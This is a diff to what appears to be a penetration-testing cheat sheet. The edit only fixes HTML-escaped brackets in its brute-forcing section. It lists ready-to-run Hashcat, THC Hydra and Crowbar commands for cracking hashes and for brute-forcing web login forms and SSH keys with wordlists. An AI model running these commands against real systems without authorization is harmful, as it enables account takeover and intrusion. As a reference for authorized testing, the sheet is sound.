@@ -12,8 +12,8 @@ Hashcat (rules)----hashcat  -m 1000 hash words.txt -w3 -O -r rule.rule
 
 ##Brute Forcing
 THC Hydra----
-HTTPS form post----hydra &lt;ip-address&gt; https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -l test -P /usr/share/wordlists/rockyou.txt -t 16 -w 30 -o hydra.out.txt -vV
+HTTPS form post----hydra <ip-address> https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -l test -P /usr/share/wordlists/rockyou.txt -t 16 -w 30 -o hydra.out.txt -vV
 
 HTTP with user specified----hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 32 192.168.0.150 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -vV
 
-Crowbar (Brute SSH Keys)----crowbar -b sshkey -s &lt;ip&gt;/32 -U userlist -k keys/debian-ssh/uncommon_keys/rsa1/4096/
+Crowbar (Brute SSH Keys)----crowbar -b sshkey -s <ip>/32 -U userlist -k keys/debian-ssh/uncommon_keys/rsa1/4096/
